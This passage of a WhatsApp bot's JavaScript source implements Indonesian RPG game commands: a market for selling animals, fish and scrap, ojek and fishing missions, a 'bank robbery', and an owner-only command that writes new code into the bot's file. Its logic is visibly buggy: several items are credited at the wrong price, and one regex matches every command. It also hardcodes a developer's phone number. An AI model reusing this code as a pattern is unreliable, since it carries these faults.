🐼 Panda: ${Spanda}
🐃 Kerbau: ${Skerbau}
🐊 Buaya: ${Sbuaya}
🐂 Sapi: ${Ssapi}
🐒 Monyet: ${Smonyet}
🐗 Babi Hutan: ${Sbabihutan}
🐖 Babi: ${Sbabi}
🐔 Ayam: ${Sayam}
╍╌╌╍╌╌╍╌╌╍╌╌┅═━––––––๑
📌 *Contoh penggunaan :*\n═┅═━––––––━––––––๑
#pasar jual ayam [Jumlah]
`.trim()
    try {
        if (/pasar|toko/i.test(command)) {
            const count = args[2] && args[2].length > 0 ? Math.min(99999999, Math.max(parseInt(args[2]), 1)) : !args[2] || args.length < 4 ? 1 :Math.min(1, count)
            const sampah = global.db.users[m.sender].sampah
            switch (jualbeli) {

            case 'jual': 
                switch (_type) {                  
                     case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng Kamu Tidak Cukup`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau Kamu Tidak Cukup`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah Kamu Tidak Cukup`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing Kamu Tidak Cukup`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda Kamu Tidak Cukup`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya Kamu Tidak Cukup`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau Kamu Tidak Cukup`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi Kamu Tidak Cukup`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet Kamu Tidak Cukup`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi Kamu Tidak Cukup`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan Kamu Tidak Cukup`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam Kamu Tidak Cukup`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting Kamu Tidak Cukup`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan Kamu Tidak Cukup`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory Kamu Tidak Cukup`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita Kamu Tidak Cukup`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal Kamu Tidak Cukup`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu Kamu Tidak Cukup`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca Kamu Tidak Cukup`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba Kamu Tidak Cukup`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus Kamu Tidak Cukup`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster Kamu Tidak Cukup`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang Kamu Tidak Cukup`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi Kamu Tidak Cukup`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol Kamu Tidak Cukup`.trim())
                        break
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng Kamu Tidak Cukup`.trim())
                        break
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus Kamu Tidak Cukup`.trim())
                        break
                        case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas Kamu Tidak Cukup`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik Kamu Tidak Cukup`.trim())
                        break
                    default:
                        return m.reply(Kchat)
                }
                break
            default:
                return m.reply(Kchat)
            }

        } else if (/sell|jual|/i.test(command)) {
            const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
            switch (type) { 
                       case 'banteng':
                        if (global.db.users[m.sender].banteng >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].banteng -= count * 1
                            reply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
                        } else reply( `Banteng Kamu Tidak Cukup`.trim())
                        break
                        case 'harimau':
                        if (global.db.users[m.sender].harimau >= count * 1) {
                            global.db.users[m.sender].money += Sharimau * count
                            global.db.users[m.sender].harimau -= count * 1
                            reply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
                        } else reply( `Harimau Kamu Tidak Cukup`.trim())
                        break
                        case 'gajah':
                        if (global.db.users[m.sender].gajah >= count * 1) {
                            global.db.users[m.sender].money += Sgajah * count
                            global.db.users[m.sender].gajah -= count * 1
                            reply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
                        } else reply( `Gajah Kamu Tidak Cukup`.trim())
                        break
                        case 'kambing':
                        if (global.db.users[m.sender].kambing >= count * 1) {
                            global.db.users[m.sender].money += Skambing * count
                            global.db.users[m.sender].kambing -= count * 1
                            reply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
                        } else reply( `Kambing Kamu Tidak Cukup`.trim())
                        break
                        case 'panda':
                        if (global.db.users[m.sender].panda >= count * 1) {
                            global.db.users[m.sender].money += Spanda * count
                            global.db.users[m.sender].panda -= count * 1
                            reply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Panda Kamu Tidak Cukup`.trim())
                        break
                        case 'buaya':
                        if (global.db.users[m.sender].buaya >= count * 1) {
                            global.db.users[m.sender].money += Sbuaya * count
                            global.db.users[m.sender].buaya -= count * 1
                            reply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
                        } else reply( `Buaya Kamu Tidak Cukup`.trim())
                        break
                        case 'kerbau':
                        if (global.db.users[m.sender].kerbau >= count * 1) {
                            global.db.users[m.sender].money += Skerbau * count
                            global.db.users[m.sender].kerbau -= count * 1
                            reply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
                        } else reply( `Kerbau Kamu Tidak Cukup`.trim())
                        break
                        case 'sapi':
                        if (global.db.users[m.sender].sapi >= count * 1) {
                            global.db.users[m.sender].money += Ssapi * count
                            global.db.users[m.sender].sapi -= count * 1
                            reply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
                        } else reply( `Sapi Kamu Tidak Cukup`.trim())
                        break
                        case 'monyet':
                        if (global.db.users[m.sender].monyet >= count * 1) {
                            global.db.users[m.sender].money += Smonyet * count
                            global.db.users[m.sender].monyet -= count * 1
                            reply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
                        } else reply( `Monyet Kamu Tidak Cukup`.trim())
                        break
                        case 'babi':
                        if (global.db.users[m.sender].babi >= count * 1) {
                            global.db.users[m.sender].money += Sbabi * count
                            global.db.users[m.sender].babi -= count * 1
                            reply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
                        } else reply( `Babi Kamu Tidak Cukup`.trim())
                        break
                        case 'babihutan':
                        if (global.db.users[m.sender].babihutan >= count * 1) {
                            global.db.users[m.sender].money += Sbabihutan * count
                            global.db.users[m.sender].babihutan -= count * 1
                            reply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
                        } else reply( `Babi Hutan Kamu Tidak Cukup`.trim())
                        break
                        case 'ayam':
                        if (global.db.users[m.sender].ayam >= count * 1) {
                            global.db.users[m.sender].money += Sayam * count
                            global.db.users[m.sender].ayam -= count * 1
                            reply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
                        } else reply( `Ayam Kamu Tidak Cukup`.trim())
                        break
                        //mancing
                        case 'kepiting':
                        if (global.db.users[m.sender].kepiting >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].kepiting -= count * 1
                            reply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
                        } else reply( `Kepiting Kamu Tidak Cukup`.trim())
                        break
                        case 'ikan':
                        if (global.db.users[m.sender].ikan >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].ikan -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
                        } else reply( `Ikan Kamu Tidak Cukup`.trim())
                        break
                        case 'dory':
                        if (global.db.users[m.sender].dory >= count * 1) {
                            global.db.users[m.sender].money += Sdory * count
                            global.db.users[m.sender].dory -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
                        } else reply( `Ikan Dory Kamu Tidak Cukup`.trim())
                        break
                        case 'gurita':
                        if (global.db.users[m.sender].gurita >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].gurita -= count * 1
                            reply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
                        } else reply( `Gurita Kamu Tidak Cukup`.trim())
                        break
                        case 'buntal':
                        if (global.db.users[m.sender].buntal >= count * 1) {
                            global.db.users[m.sender].money += Sbuntal * count
                            global.db.users[m.sender].buntal -= count * 1
                            reply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
                        } else reply( `Ikan Buntal Kamu Tidak Cukup`.trim())
                        break
                        case 'hiu':
                        if (global.db.users[m.sender].hiu >= count * 1) {
                            global.db.users[m.sender].money += Shiu * count
                            global.db.users[m.sender].hiu -= count * 1
                            reply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
                        } else reply( `Hiu Kamu Tidak Cukup`.trim())
                        break
                        case 'orca':
                        if (global.db.users[m.sender].orca >= count * 1) {
                            global.db.users[m.sender].money += Sorca * count
                            global.db.users[m.sender].orca -= count * 1
                            reply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
                        } else reply( `Paus Orca Kamu Tidak Cukup`.trim())
                        break
                        case 'lumba':
                        if (global.db.users[m.sender].lumba >= count * 1) {
                            global.db.users[m.sender].money += Skepiting * count
                            global.db.users[m.sender].lumba -= count * 1
                            reply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
                        } else reply( `Lumba Lumba Kamu Tidak Cukup`.trim())
                        break
                        case 'paus':
                        if (global.db.users[m.sender].paus >= count * 1) {
                            global.db.users[m.sender].money += Spaus * count
                            global.db.users[m.sender].paus -= count * 1
                            reply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
                        } else reply( `Paus Kamu Tidak Cukup`.trim())
                        break
                  case 'lobster':
                        if (global.db.users[m.sender].lobster >= count * 1) {
                            global.db.users[m.sender].money += Slobster * count
                            global.db.users[m.sender].lobster -= count * 1
                            reply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
                        } else reply( `Lobster Kamu Tidak Cukup`.trim())
                        break
                     case 'udang':
                        if (global.db.users[m.sender].udang >= count * 1) {
                            global.db.users[m.sender].money += Sudang * count
                            global.db.users[m.sender].udang -= count * 1
                            reply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
                        } else reply( `Udang Kamu Tidak Cukup`.trim())
                        break
                      case 'cumi':
                        if (global.db.users[m.sender].cumi >= count * 1) {
                            global.db.users[m.sender].money += Scumi * count
                            global.db.users[m.sender].cumi -= count * 1
                            reply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
                        } else reply( `Cumi Kamu Tidak Cukup`.trim())
                         break
                        case 'botol':
                        if (global.db.users[m.sender].botol >= count * 1) {
                            global.db.users[m.sender].money += Sbotol * count
                            global.db.users[m.sender].botol -= count * 1
                            reply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
                        } else reply( `Botol Kamu Tidak Cukup`.trim())
                        break         
                        case 'kaleng':
                        if (global.db.users[m.sender].kaleng >= count * 1) {
                            global.db.users[m.sender].money += Skaleng * count
                            global.db.users[m.sender].kaleng -= count * 1
                            reply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
                        } else reply( `Kaleng Kamu Tidak Cukup`.trim())
                        break        
                        case 'kardus':
                        if (global.db.users[m.sender].kardus >= count * 1) {
                            global.db.users[m.sender].money += Skardus * count
                            global.db.users[m.sender].kardus -= count * 1
                            reply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
                        } else reply( `Kardus Kamu Tidak Cukup`.trim())
                        break
                         case 'gelas':
                        if (global.db.users[m.sender].gelas >= count * 1) {
                            global.db.users[m.sender].money += Sgelas * count
                            global.db.users[m.sender].gelas -= count * 1
                            reply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
                        } else reply( `Gelas Kamu Tidak Cukup`.trim())
                        break
                        case 'plastik':
                        if (global.db.users[m.sender].plastik >= count * 1) {
                            global.db.users[m.sender].money += Splastik * count
                            global.db.users[m.sender].plastik -= count * 1
                            reply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
                        } else reply( `Plastik Kamu Tidak Cukup`.trim())
                        break       
                default:
                    return m.reply(Kchat)
            }
        }
} catch (err) {
console.log(util.format(err))
let e = String(err)
XeonBotInc.sendMessage("6285892928715@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}
break
//==================================================================
case 'ojek': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = XeonBotInc.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Ojek'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi: {}
    if (id in XeonBotInc.misi) {
        reply( `Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️       🛵
✔️ Mendapatkan orderan....
`.trim()

        var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Mengantar ke tujuan....
`.trim()

        var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️
➕ Sampai di tujuan....
`.trim()

        var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳  🌳 🏘️ 🚶
➕ 💹Menerima gaji....
`.trim()

        var hsl = `
*—[ Hasil Ngojek ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()
        
        user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1

		XeonBotInc.misi[id] = [
            kerja,
            setTimeout(() => {
                delete XeonBotInc.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            m.reply(hsl)
        }, 27000)

        setTimeout(() => {
            m.reply(dimas4)
        }, 25000)

        setTimeout(() => {
            m.reply(dimas3)
        }, 20000)

        setTimeout(() => {
            m.reply(dimas2)
        }, 15000)

        setTimeout(() => {
            m.reply(dimas)
        }, 10000)

        setTimeout(() => {
            m.reply('🔍Mencari pelanggan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//==================================================================
case 'maling': {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit " + seconds + " detik"
}
const timeout = 604800000

    let user = db.users[m.sender]
    let time = user.lastmaling + 604800000
    if (new Date - user.lastmaling< 604800000) return m.reply(`📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(time - new Date())} lagi`)
	let money = `${Math.floor(Math.random() * 30000)}`.trim()
	let exp = `${Math.floor(Math.random() * 999)}`.trim()
	let kardus = `${Math.floor(Math.random() * 1000)}`.trim()
	user.money += money * 1
	user.exp += exp * 1
	user.kardus += kardus * 1
	user.lastmaling = new Date * 1
    m.reply(`Selamat kamu mendapatkan : \n💰+${money} Money\📦+${kardus} Kardus\n✨+${exp} Exp`)
    setTimeout(() => {
        reply(`Yuk waktunya Maling lagi 👋…`)
    }, timeout)
}
break
//==================================================================
case 'mancing': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = XeonBotInc.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Memancing'
    XeonBotInc.misi = XeonBotInc.misi ? XeonBotInc.misi : {}
    if (id in XeonBotInc.misi) {
        reply(`Selesaikan Misi ${XeonBotInc.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (user.umpan == 0) return m.reply('Kamu Membutuhkan Umpan 🪱 Untuk Memancing!')
    if (user.fishingrod == 0 ) return m.reply('Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing')
    if (new Date - user.lastmisi > 3600000) {
		let ikan1 = Math.floor(Math.random() * 5)
		let ikan2 = Math.floor(Math.random() * 5)
		let ikan3 = Math.floor(Math.random() * 5)
		let ikan4 = Math.floor(Math.random() * 5)
		let ikan5 = Math.floor(Math.random() * 5)
		let ikan6 = Math.floor(Math.random() * 5)
		let ikan7 = Math.floor(Math.random() * 5)
		let ikan8 = Math.floor(Math.random() * 5)
		let ikan9 = Math.floor(Math.random() * 5)
		let ikan10 = Math.floor(Math.random() * 5)
		let ikan11 = Math.floor(Math.random() * 5)
           
		let hsl = `   
*📮 Hasil tangkapan Mu*
${ikan1 ? `
🦀 Kepiting: ${ikan1}` : ''} ${ikan2 ? `
🦞 Lobster: ${ikan2}` : ''} ${ikan3 ? `
🦐 Udang: ${ikan3}` : ''} ${ikan4 ? `
🦑 Cumi: ${ikan4}` : ''} ${ikan5 ? `
🐙 Gurita: ${ikan5}` : ''} ${ikan6 ? `
🐡 Buntal: ${ikan6}` : ''} ${ikan7 ? `
🐠 Dory: ${ikan7}` : ''} ${ikan8 ? `
🐳 Orca: ${ikan8}` : ''} ${ikan9 ? `
🐬 Lumba: ${ikan9}` : ''} ${ikan10 ? `
🐋 Paus: ${ikan10}` : ''} ${ikan11 ? `
🦈 Hiu: ${ikan11}` : ''}
`.trim()
		user.kepiting += ikan1
		user.lobster += ikan2
		user.udang += ikan3
		user.cumi += ikan4
		user.gurita += ikan5
		user.buntal += ikan6
		user.dory += ikan7
		user.orca += ikan8
		user.lumba += ikan9
		user.paus += ikan10
		user.hiu += ikan11
		user.fishingroddurability -= 10
		user.umpan -= 1
		
		XeonBotInc.misi[id] = [
        kerja,
        setTimeout(() => {
            delete XeonBotInc.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			m.reply(hsl)
		}, 20000)

		setTimeout(() => {
			m.reply(`Ini Dia Hasil Tangkapanmu`)
		}, 18000)

		setTimeout(() => {
			m.reply('Kamu Berhasil Menarik Ikan Keluar Dari Air')
		}, 15000)

		setTimeout(() => {
			m.reply('Kamu Menarik Kailmu')
		}, 12000)
		
		setTimeout(() => {
			m.reply('Kail Mu Di Tarik Ikan...')
		}, 9000)

		setTimeout(() => {
			m.reply('Kamu Sedang Memancing...')
		}, 0)
		user.lastmisi = new Date * 1
	} else m.reply(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`)
}
break

//==================================================================
case 'nguli': {
  if (!m.isGroup) return reply(mess.only.group)
    if (new Date - global.db.users[m.sender].lastnguli > 86400000) {
      global.db.users[m.sender].limit += 10
      m.reply('_🎉Selamat kamu mendapatkan +10 limit_')
      global.db.users[m.sender].lastnguli = new Date * 1
    } else m.reply('[💬] Anda sudah mengklaim upah nguli hari ini')
  }
break
//==================================================================
  case 'addcase': {
    if (!XeonTheCreator) return XeonStickOwner()
    if (!text) return replygcxeon('Mana case nya');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'XeonCheems8.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replygcxeon('Terjadi kesalahan saat menulis file:', err);
            } else {
                replygcxeon('Case baru berhasil ditambahkan di atas case gimage.');
            }
        });
    } else {
        replygcxeon('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break;

  
  // Case-case lainnya

//==================================================================
case 'annyeong': { 
  reply('nee anyeong chinguyaa')
}
break

